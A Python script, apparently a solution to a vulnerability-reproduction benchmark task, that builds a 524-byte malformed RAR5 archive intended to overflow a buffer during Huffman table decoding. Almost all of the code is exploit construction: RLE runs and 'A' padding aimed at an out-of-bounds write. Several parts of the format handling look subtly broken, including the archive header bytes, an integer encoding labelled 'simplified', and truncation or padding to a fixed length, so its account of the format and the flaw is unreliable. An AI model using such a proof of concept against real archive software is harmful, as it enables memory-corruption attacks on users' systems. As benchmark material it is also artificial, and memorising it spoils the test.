import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature (8 bytes)
        signature = b'Rar!\x1a\x07\x01\x00'
        
        # Main archive header (type 1)
        archive_header = b'\x01\x00\x03'
        
        # File header (type 2) with flags for compression settings and data
        # Flags: 0x1800 (compression settings + data)
        file_header_flags = b'\x18\x00'
        
        # Header size will be calculated later
        # For now, placeholder
        header_size = b'\x00'
        
        # Compression settings
        # Version 0, method 4 (maximum), dictionary size 0 (1MB)
        compression_settings = b'\x00\x04\x00'
        
        # Huffman table - this is where the overflow occurs
        # Table size is stored as variable length integer
        # We want to trigger overflow when reading Huffman table
        
        # Craft malformed Huffman table data
        # The vulnerability is in the RLE-like decompression of Huffman tables
        # We need to create a table that causes buffer overflow
        
        # First, create normal-looking RAR5 data
        poc = signature + archive_header
        
        # File header starts with type 2
        file_header = b'\x02'
        
        # Calculate total file header size
        # We'll build it incrementally
        
        # File flags: 0x1800 (compression + data)
        file_header += file_header_flags
        
        # Header size will be 13 + filename length + huffman table size
        # We'll use a small filename
        filename = b'test.txt'
        filename_len = bytes([len(filename)])
        
        # Compression settings (3 bytes)
        comp_settings = compression_settings
        
        # Now the critical part: Huffman table
        # The vulnerability is in rar5_decode_huffman_table function
        # It reads a byte count then RLE-encoded data
        # We need to make it read more bytes than allocated
        
        # First, the table byte count (variable length integer)
        # We'll say we have 255 bytes (0xFF)
        table_byte_count = b'\xFF'
        
        # The actual table data that triggers overflow
        # We need to craft RLE data that causes buffer overflow
        # The RLE format: 
        # - If high bit set: (byte & 0x7F) + 1 zeros
        # - Else: byte + 1 literal bytes follow
        
        # We'll create a sequence that causes overflow
        # Start with some normal data
        table_data = b''
        
        # Add some zeros using RLE (high bit set)
        # 0x80 means 1 zero, 0x81 means 2 zeros, etc.
        # We'll add many zeros to fill buffer
        for _ in range(10):
            table_data += b'\xFF'  # 128 zeros
        
        # Now add literal data that will overflow
        # The vulnerability: insufficient bounds checking when copying literal data
        # We need to provide more literal bytes than expected
        
        # First, a non-RLE byte indicating literal length
        # Byte value N means N+1 literal bytes follow
        # We'll use 0x7F which means 128 literal bytes follow
        table_data += b'\x7F'
        
        # Add the literal bytes - these will overflow the buffer
        # We need exactly 524 bytes total PoC
        # Calculate how many more bytes we need
        current_length = len(poc) + 1 + len(file_header_flags) + 1 + len(filename_len) + len(filename) + 3 + 1 + len(table_data)
        
        # Add literal bytes to reach target
        literal_bytes_needed = 524 - current_length - 1  # -1 for the 0x7F we already added
        if literal_bytes_needed > 128:
            literal_bytes_needed = 128
            
        # Add the literal bytes
        table_data += b'A' * literal_bytes_needed
        
        # Complete the Huffman table
        huffman_table = table_byte_count + table_data
        
        # Calculate total header size
        total_header_size = (1 +  # type
                            2 +  # flags
                            1 +  # header size field itself (simplified)
                            len(filename_len) + len(filename) +
                            len(comp_settings) +
                            len(huffman_table) +
                            1)   # data size (0)
        
        # Encode header size as variable length integer
        if total_header_size < 0x80:
            header_size = bytes([total_header_size])
        else:
            # Simplified: use 2-byte encoding
            header_size = bytes([0x80 | (total_header_size >> 8), total_header_size & 0xFF])
        
        # Build complete file header
        file_header += header_size
        file_header += filename_len + filename
        file_header += comp_settings
        file_header += huffman_table
        file_header += b'\x00'  # Data size 0 (no actual file data)
        
        # Add everything to PoC
        poc += file_header
        
        # End of archive header (type 3)
        poc += b'\x03\x00\x03'
        
        # Ensure exact length of 524 bytes
        if len(poc) > 524:
            poc = poc[:524]
        elif len(poc) < 524:
            poc += b'A' * (524 - len(poc))
        
        return poc
